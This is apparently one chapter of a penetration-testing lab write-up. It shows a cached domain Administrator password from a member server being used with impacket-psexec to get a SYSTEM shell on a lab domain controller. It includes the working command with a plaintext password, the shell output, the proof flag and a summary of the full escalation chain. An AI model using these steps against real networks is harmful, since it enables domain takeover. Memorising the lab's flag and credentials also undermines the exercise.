# 12 — DC01: the cached credential is domain-tier

The password recovered from MS01's DCC2 cache is used here for the first time. It authenticates
to the domain controller as the built-in Administrator and returns a SYSTEM shell — which is the
end of the set.

---

## 12.1 The login

```bash
impacket-psexec 'Administrator':'7Tg9M9MZbzAokR9'@10.10.131.146
```

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

PS C:\Users\Administrator\Desktop> whoami
nt authority\system
```

The scrollback jumps from the Impacket banner to the shell prompt; the service-creation lines
`psexec` prints in between are not in this capture.

`psexec` uploads a service binary to `ADMIN$`, registers it as a service, starts it, and the
service runs as `SYSTEM`. It is noisy — service creation, a file on disk, an event log entry —
but on a DC with a working administrative credential it is reliable.

---

## 12.2 Why `Administrator` here is the domain account

On a domain controller there is no separate local `Administrator`: the built-in account is the
domain's built-in Administrator (`S-1-5-21-…-500`). A logon as `Administrator` on DC01 is
therefore a **domain** logon, not a local one.

The password did not come from DC01. It came from the `OSCP.EXAM/Administrator` DCC2 entry in
MS01's `SECURITY` hive (chapter 09), left there by an interactive domain-administrator logon in
2022. That is the boundary the cache crossed: a member server kept a verifier for the domain
Administrator, and a local administrator on that member server could read it.

---

## 12.3 The flag, attributable

```powershell
ls
```

```
    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/25/2026   7:49 PM             70 proof.txt
```

```powershell
cat proof.txt
```

```
f6a8a664f1a84134905200191b7ee464
```

```powershell
ipconfig
```

```
Windows IP Configuration

Ethernet adapter tap53be1893-d6:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::f1ff:ca80:9de1:9a2c%23
   IPv4 Address. . . . . . . . . . . : 10.10.131.146
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.131.254
```

The value alone would be a string. Tied to `whoami` (`nt authority\system`) and `ipconfig`
(`10.10.131.146`, the DC) in the same session, it is evidence of *where* and *as whom* it was
read.

| Check | Value |
|---|---|
| Identity | `nt authority\system` |
| Host | `10.10.131.146` (DC01) |
| File | `C:\Users\Administrator\Desktop\proof.txt` |
| Flag | `f6a8a664f1a84134905200191b7ee464` |

---

## 12.4 What is proven — and what is not

**Proven.** A credential recovered from MS01's cached domain logons authenticates to DC01 as the
built-in domain Administrator and yields `SYSTEM`; the flag was read in that session.

**Not done.** No `DCSync` of `krbtgt`, no golden ticket, no persistence. The set ends at the flag;
domain control is demonstrated by the logon, not by extracting the directory database.

**Not tested.** Whether the same password works on MS02, or anywhere else in the range. The
domain Administrator would be expected to, but this pass did not try.

---

## 12.5 Status of the set

| Host | Address | State |
|---|---|---|
| MS01 | `10.10.131.147` | **SYSTEM** — PrintSpoofer, local-admin add |
| MS02 | `10.10.131.148` | reachable, enumerated, **no attack in this capture** |
| DC01 | `10.10.131.146` | **SYSTEM** — `proof.txt` read |

| Objective | State |
|---|---|
| Local admin on MS01 | yes (`Administrator:December31`, and `eric.wallows` added) |
| Domain admin | **yes** — built-in Administrator on DC01 |
| `proof.txt` | **read** — `f6a8a664f1a84134905200191b7ee464` |
| MS02 owned | no — not on the path that finished the set |

Cleanup is not shown: `eric.wallows` is still in MS01's local `Administrators`, and the ligolo
agent is still running. `psexec`'s service is transient by design, but the capture does not show
it being removed either.

---

## 12.6 What this pass changes about the page

Pass 2 ended with a plan: roast `sql_svc`, because MS02's token held nothing and the directory
had no writable edges. That plan was correct **for that position**. This pass never ran it,
because a shorter path existed:

1. `SeImpersonate` on MS01 gives SYSTEM, and SYSTEM can read the registry.
2. The `SECURITY` hive keeps cached domain logons — a store LSASS triage does not see.
3. A domain administrator had logged on to MS01 in 2022, so the cache held the domain
   Administrator's verifier.
4. A local-admin add on MS01 is enough to dump it remotely.
5. The credential works on DC01 directly; MS02 never has to fall.

The general lesson is not "kerberoast is wrong" — it is that **credential stores are plural**.
LSASS is the one everyone checks. `SECURITY`'s DCC2 cache, LSA secrets and unattended-install
passwords are on the same host, behind the same administrator rights, and on a member server they
are often worth more.
